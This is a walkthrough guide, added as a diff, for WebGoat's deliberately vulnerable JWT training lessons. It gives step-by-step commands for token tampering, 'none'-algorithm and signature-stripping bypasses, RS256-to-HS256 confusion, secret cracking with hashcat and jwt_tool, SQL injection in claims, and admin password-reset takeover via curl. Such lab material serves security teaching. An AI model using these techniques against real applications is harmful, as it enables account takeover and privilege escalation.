@@ -1,0 +1,661 @@
+===============================================
+  WEBGOAT JWT CHALLENGES - COMPLETE GUIDE
+===============================================
+
+Target: http://192.168.254.112:8001/WebGoat/JWT
+Tools: jwt_complete_toolkit.html, jwt_automation.ps1
+
+===============================================
+  TABLE OF CONTENTS
+===============================================
+1. JWT Basics
+2. JWT Structure & Decoding
+3. Attack 1: Token Tampering
+4. Attack 2: Algorithm Confusion
+5. Attack 3: Weak Secret Brute Force
+6. Attack 4: Admin Access Bypass
+7. Attack 5: Password Reset Attack
+8. External Tools
+9. Quick Reference Commands
+
+===============================================
+  1. JWT BASICS
+===============================================
+
+What is JWT?
+- JSON Web Token - used for authentication/authorization
+- Stateless token containing user claims
+- Server trusts token if signature is valid
+
+JWT Format: HEADER.PAYLOAD.SIGNATURE
+
+Example:
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
+eyJzdWIiOiJ1c2VyMTIzIiwibmFtZSI6IkpvaG4ifQ.
+SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+Parts:
+1. HEADER: Algorithm & token type
+   {"alg": "HS256", "typ": "JWT"}
+
+2. PAYLOAD: Claims (user data)
+   {"sub": "user123", "name": "John", "admin": false}
+
+3. SIGNATURE: HMAC-SHA256(header + payload, secret)
+   Prevents tampering (in theory)
+
+===============================================
+  2. JWT STRUCTURE & DECODING
+===============================================
+
+Manual Decoding:
+1. Split token by dots: header.payload.signature
+2. Base64URL decode header and payload
+3. Parse JSON
+
+Using Tools:
+- jwt_complete_toolkit.html > Decoder tab
+- PowerShell: jwt_automation.ps1 > Option 1
+- Online: https://jwt.io (paste token)
+
+Example Decoded:
+Header:
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+
+Payload:
+{
+  "sub": "user123",
+  "name": "John Doe",
+  "admin": false,
+  "iat": 1516239022,
+  "exp": 1516242622
+}
+
+Common Claims:
+- sub: Subject (username/user ID)
+- iat: Issued at time
+- exp: Expiration time
+- admin/role: Authorization claims
+- name: User's name
+
+===============================================
+  3. ATTACK 1: TOKEN TAMPERING
+===============================================
+
+Goal: Modify JWT claims without valid signature
+
+Why It Works:
+- Server doesn't verify signature properly
+- Server accepts tampered token
+- Signature validation is disabled/broken
+
+Attack Methods:
+
+METHOD 1: Change "admin" to true
+-----------------------------------
+1. Decode JWT
+2. Modify payload: "admin": false → "admin": true
+3. Re-encode payload (Base64URL)
+4. Keep original header and signature
+5. Submit tampered token
+
+PowerShell:
+.\jwt_automation.ps1
+Choose option 2
+
+HTML Tool:
+jwt_complete_toolkit.html > Token Tampering > Make Admin
+
+cURL Example:
+curl -X POST http://192.168.254.112:8001/WebGoat/JWT/[endpoint] \
+  -H "Authorization: Bearer [TAMPERED_TOKEN]" \
+  -H "Content-Type: application/json"
+
+METHOD 2: Change username to "admin"
+--------------------------------------
+Modify payload:
+"sub": "user123" → "sub": "admin"
+"name": "John" → "name": "admin"
+
+PowerShell: Option 3
+HTML Tool: Token Tampering > Change User ID
+
+METHOD 3: SQL Injection in JWT
+--------------------------------
+If server uses JWT claims in SQL query:
+
+Modify payload:
+"sub": "admin' OR '1'='1"
+
+PowerShell: Option 4
+HTML Tool: Token Tampering > SQL Injection
+
+METHOD 4: Custom Field Modification
+-------------------------------------
+Add/modify any field:
+- "role": "admin"
+- "isAdmin": true
+- "permissions": ["read", "write", "delete"]
+
+PowerShell: Option 11 (custom tamper)
+HTML Tool: Token Tampering > Custom Field
+
+===============================================
+  4. ATTACK 2: ALGORITHM CONFUSION
+===============================================
+
+Goal: Bypass signature verification via algorithm manipulation
+
+ATTACK A: "none" Algorithm
+----------------------------
+JWT spec allows alg: "none" (no signature)
+
+Steps:
+1. Decode JWT
+2. Change header: "alg": "HS256" → "alg": "none"
+3. Re-encode header
+4. Remove signature: header.payload.
+
+PowerShell: Option 6
+HTML Tool: Algorithm Confusion > "none" + Remove Signature
+
+Example:
+Original: eyJhbGci...payload...signature
+Modified: eyJhbGci...payload.
+
+ATTACK B: RS256 → HS256
+-------------------------
+Theory:
+- RS256 uses asymmetric keys (private signs, public verifies)
+- HS256 uses symmetric key (same key signs & verifies)
+- If server has RS256 public key and accepts HS256...
+- Sign token with public key as HMAC secret!
+
+Steps:
+1. Get server's public key
+2. Change alg: "RS256" → "HS256"
+3. Sign token with HMAC using public key as secret
+4. Server uses public key to verify HMAC (thinks it's validating)
+
+This is ADVANCED - requires external tools:
+jwt_tool.py TOKEN -X k -pk public.pem
+
+ATTACK C: Remove Signature Only
+---------------------------------
+Some servers don't check if signature exists:
+header.payload.signature → header.payload.
+
+PowerShell: Option 7
+HTML Tool: Algorithm Confusion > Remove Signature Only
+
+===============================================
+  5. ATTACK 3: WEAK SECRET BRUTE FORCE
+===============================================
+
+Goal: Crack JWT signing secret to create valid tokens
+
+When It Works:
+- Server uses weak/common secret
+- HMAC algorithms (HS256, HS384, HS512)
+- Can't crack RS256 (uses private key)
+
+Attack Process:
+1. Get valid JWT from server
+2. Brute force HMAC secret with wordlist
+3. Sign new token with found secret
+4. Access anything as anyone
+
+Tools for Cracking:
+
+1. jwt_tool (Python)
+-------------------
+pip install pyjwt
+git clone https://github.com/ticarpi/jwt_tool
+python jwt_tool.py TOKEN -C -d wordlist.txt
+
+2. hashcat
+-----------
+hashcat -m 16500 jwt.txt wordlist.txt -a 0
+
+Prepare jwt.txt:
+eyJhbGci...full_token_here
+
+3. john (John the Ripper)
+--------------------------
+john --format=HMAC-SHA256 jwt.txt --wordlist=wordlist.txt
+
+4. PowerShell Script (Limited)
+-------------------------------
+.\jwt_automation.ps1
+Option 8 (brute force with common secrets)
+
+Common Secrets to Try:
+- secret
+- password
+- webgoat
+- 123456
+- admin
+- jwt
+- token
+- key
+
+Creating Custom Wordlist:
+rockyou.txt (famous password list)
+SecLists: https://github.com/danielmiessler/SecLists
+
+After Finding Secret:
+1. Create new payload: {"sub": "admin", "admin": true}
+2. Sign with found secret
+3. Use token to authenticate as admin
+
+PowerShell: Option 9 (sign new token)
+HTML Tool: Weak Secrets > Sign with Found Secret
+
+===============================================
+  6. ATTACK 4: ADMIN ACCESS BYPASS
+===============================================
+
+Common WebGoat JWT Challenges:
+
+CHALLENGE: Become Admin
+-------------------------
+1. Get your user JWT token
+2. Decode and check payload
+3. Try tampering attacks:
+   - Set admin: true
+   - Change username to admin
+   - Change role to admin
+   - Try SQL injection
+
+METHOD 1: Simple Tampering
+----------------------------
+Current: {"sub": "user123", "admin": false}
+Modified: {"sub": "user123", "admin": true}
+
+PowerShell: Option 2
+HTML Tool: Admin Access > Method 1
+
+METHOD 2: Username Change
+---------------------------
+Current: {"sub": "user123", "name": "John"}
+Modified: {"sub": "admin", "name": "admin"}
+
+PowerShell: Option 3
+HTML Tool: Admin Access > Method 2
+
+METHOD 3: SQL Injection
+------------------------
+Current: {"sub": "user123"}
+Modified: {"sub": "admin' OR '1'='1"}
+
+Server code might be:
+SELECT * FROM users WHERE username = '[JWT.sub]'
+
+Becomes:
+SELECT * FROM users WHERE username = 'admin' OR '1'='1'
+
+PowerShell: Option 4
+HTML Tool: Admin Access > Method 3
+
+METHOD 4: Multiple Admin Flags
+--------------------------------
+Modified: {
+  "sub": "admin",
+  "admin": true,
+  "role": "admin",
+  "isAdmin": true,
+  "authorities": ["ROLE_ADMIN"]
+}
+
+HTML Tool: Admin Access > Method 4
+
+Testing:
+curl -X GET http://192.168.254.112:8001/WebGoat/JWT/admin \
+  -H "Authorization: Bearer [TOKEN]"
+
+===============================================
+  7. ATTACK 5: PASSWORD RESET ATTACK
+===============================================
+
+Scenario:
+Password reset links contain JWT tokens with username
+Attacker can tamper token to reset admin's password
+
+CHALLENGE: Reset Another User's Password
+------------------------------------------
+
+Step 1: Get Your Reset Token
+1. Request password reset for your account
+2. Capture JWT token from email/URL
+3. Decode token to see structure
+
+Example Token Payload:
+{
+  "sub": "youruser",
+  "username": "youruser",
+  "action": "password_reset",
+  "exp": 1609459200
+}
+
+Step 2: Tamper Token
+1. Change username: "youruser" → "admin"
+2. Keep other fields same
+
+Step 3: Attack Methods
+
+METHOD 1: Tamper + Keep Signature
+-----------------------------------
+Hope server doesn't verify signature properly
+
+PowerShell: Option 10 > Choice 1
+HTML Tool: Password Reset > Method 1
+
+METHOD 2: Tamper + Remove Signature
+-------------------------------------
+Change username and remove signature completely
+
+PowerShell: Option 10 > Choice 2
+HTML Tool: Password Reset > Method 2
+
+cURL:
+curl -X POST http://192.168.254.112:8001/WebGoat/PasswordReset/reset \
+  -H "Authorization: Bearer [TAMPERED_TOKEN]" \
+  -H "Content-Type: application/json" \
+  -d '{"password": "hacked123"}'
+
+METHOD 3: Tamper + Algorithm "none"
+-------------------------------------
+Change algorithm to "none" and remove signature
+
+PowerShell: Option 10 > Choice 3
+HTML Tool: Password Reset > Method 3
+
+METHOD 4: Brute Force Secret + Valid Token
+--------------------------------------------
+1. Brute force secret (Option 8)
+2. Create valid token with admin username (Option 9)
+3. Use properly signed token
+
+HTML Tool: Password Reset > Method 4
+
+Example Attack Flow:
+1. Request reset for "john"
+2. Get token: eyJhbGci...john...signature
+3. Tamper to: eyJhbGci...admin...signature
+4. POST to reset endpoint with new password
+5. Admin password changed!
+
+===============================================
+  8. EXTERNAL TOOLS
+===============================================
+
+JWT.io (Online Decoder)
+------------------------
+https://jwt.io
+- Paste token to decode
+- Edit payload/header
+- Sign with secret
+- Great for quick testing
+
+jwt_tool (Python)
+------------------
+GitHub: https://github.com/ticarpi/jwt_tool
+
+Installation:
+git clone https://github.com/ticarpi/jwt_tool
+cd jwt_tool
+pip install pyjwt
+
+Usage:
+# Decode token
+python jwt_tool.py TOKEN
+
+# Tamper token (interactive)
+python jwt_tool.py TOKEN -T
+
+# Brute force secret
+python jwt_tool.py TOKEN -C -d wordlist.txt
+
+# Algorithm confusion
+python jwt_tool.py TOKEN -X a  # Try all alg attacks
+
+# RS256 to HS256 with public key
+python jwt_tool.py TOKEN -X k -pk public.pem
+
+# Crack with hashcat format
+python jwt_tool.py TOKEN -jh
+
+hashcat (GPU Cracking)
+-----------------------
+# Crack JWT secret
+hashcat -m 16500 jwt.txt wordlist.txt -a 0
+
+# With rules
+hashcat -m 16500 jwt.txt wordlist.txt -r rules/best64.rule
+
+# Show cracked
+hashcat -m 16500 jwt.txt --show
+
+John the Ripper
+----------------
+# Crack JWT
+john --format=HMAC-SHA256 jwt.txt --wordlist=wordlist.txt
+
+# Show cracked
+john --show jwt.txt
+
+Burp Suite Extensions
+-----------------------
+- JSON Web Tokens
+- JWT4B (JWT for Burp)
+- Autorize (for authorization testing)
+
+Python Scripts
+---------------
+# Sign JWT with secret
+import jwt
+payload = {"sub": "admin", "admin": True}
+secret = "webgoat"
+token = jwt.encode(payload, secret, algorithm="HS256")
+print(token)
+
+# Decode JWT
+decoded = jwt.decode(token, options={"verify_signature": False})
+print(decoded)
+
+===============================================
+  9. QUICK REFERENCE COMMANDS
+===============================================
+
+DECODE JWT
+-----------
+# PowerShell
+.\jwt_automation.ps1
+Option 1
+
+# Python
+python -c "import jwt; print(jwt.decode('TOKEN', options={'verify_signature': False}))"
+
+# jwt_tool
+python jwt_tool.py TOKEN
+
+TAMPER TO ADMIN
+----------------
+# PowerShell
+.\jwt_automation.ps1
+Option 2 (admin: true)
+Option 3 (username: admin)
+
+# jwt_tool
+python jwt_tool.py TOKEN -T
+
+ALGORITHM "none"
+-----------------
+# PowerShell
+.\jwt_automation.ps1
+Option 6
+
+# jwt_tool
+python jwt_tool.py TOKEN -X a
+
+BRUTE FORCE SECRET
+-------------------
+# PowerShell (limited)
+.\jwt_automation.ps1
+Option 8
+
+# jwt_tool (recommended)
+python jwt_tool.py TOKEN -C -d wordlist.txt
+
+# hashcat (best for large wordlists)
+hashcat -m 16500 jwt.txt rockyou.txt
+
+SIGN WITH SECRET
+-----------------
+# PowerShell
+.\jwt_automation.ps1
+Option 9
+
+# Python
+python -c "import jwt; print(jwt.encode({'sub':'admin','admin':True}, 'secret', algorithm='HS256'))"
+
+SEND REQUEST
+-------------
+# cURL with JWT
+curl -X GET http://192.168.254.112:8001/WebGoat/JWT/admin \
+  -H "Authorization: Bearer TOKEN"
+
+# PowerShell
+.\jwt_automation.ps1
+Option 12
+
+PASSWORD RESET
+---------------
+# PowerShell
+.\jwt_automation.ps1
+Option 10
+
+# cURL
+curl -X POST http://192.168.254.112:8001/WebGoat/PasswordReset/reset \
+  -H "Authorization: Bearer TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"password": "newpass123"}'
+
+===============================================
+  WEBGOAT SPECIFIC TIPS
+===============================================
+
+1. Always capture your initial JWT token
+   - Look in browser dev tools (Storage > Cookies)
+   - Look in Authorization header
+   - Look in response after login
+
+2. Try attacks in this order:
+   - Tampering (easiest)
+   - Algorithm "none"
+   - Remove signature
+   - Brute force secret
+
+3. Common WebGoat secrets:
+   - webgoat
+   - secret
+   - password
+
+4. If tampering doesn't work, try SQL injection
+
+5. For buying items for $0:
+   - Tamper price in JWT claims
+   - Example: {"item": "phone", "price": 0}
+
+6. For admin access:
+   - Try admin: true
+   - Try role: admin
+   - Try username: admin
+
+7. Check all JWT locations:
+   - Authorization header
+   - Cookies
+   - URL parameters
+   - POST body
+
+===============================================
+  TROUBLESHOOTING
+===============================================
+
+"Invalid JWT format"
+- Token should have exactly 2 dots
+- Format: header.payload.signature
+
+"Signature verification failed"
+- Expected! We're attacking the verification
+- Try algorithm "none"
+- Try removing signature
+
+"Token expired"
+- Normal for real tokens
+- Tamper "exp" claim to future time
+- Example: "exp": 9999999999
+
+"Unauthorized"
+- Check Authorization header format
+- Should be: "Bearer TOKEN"
+- Not: "JWT TOKEN" or just "TOKEN"
+
+===============================================
+  LEARNING RESOURCES
+===============================================
+
+JWT Specification:
+https://datatracker.ietf.org/doc/html/rfc7519
+
+OWASP JWT Cheat Sheet:
+https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
+
+PortSwigger JWT Attacks:
+https://portswigger.net/web-security/jwt
+
+JWT Attack Playground:
+https://jwt.io
+
+WebGoat Documentation:
+https://github.com/WebGoat/WebGoat
+
+===============================================
+  SUMMARY ATTACK FLOWCHART
+===============================================
+
+Got JWT Token?
+│
+├─> Decode it (jwt_automation.ps1 Option 1)
+│
+├─> Try tampering attacks:
+│   ├─> admin: true (Option 2)
+│   ├─> username: admin (Option 3)
+│   └─> SQL injection (Option 4)
+│
+├─> If tampering fails, try algorithm attacks:
+│   ├─> "none" algorithm (Option 6)
+│   ├─> Remove signature (Option 7)
+│   └─> RS256 → HS256 (external tools)
+│
+├─> If all fails, brute force:
+│   ├─> Try common secrets (Option 8)
+│   ├─> Use jwt_tool with wordlist
+│   └─> Use hashcat for serious cracking
+│
+└─> Sign new token with found secret (Option 9)
+
+===============================================
+  END OF GUIDE
+===============================================
+
+For questions or issues:
+- Check WebGoat lesson hints
+- Try jwt.io for manual testing
+- Use jwt_tool for advanced attacks
+- Check Burp Suite for request/response details
+
+Good luck with your JWT challenges!
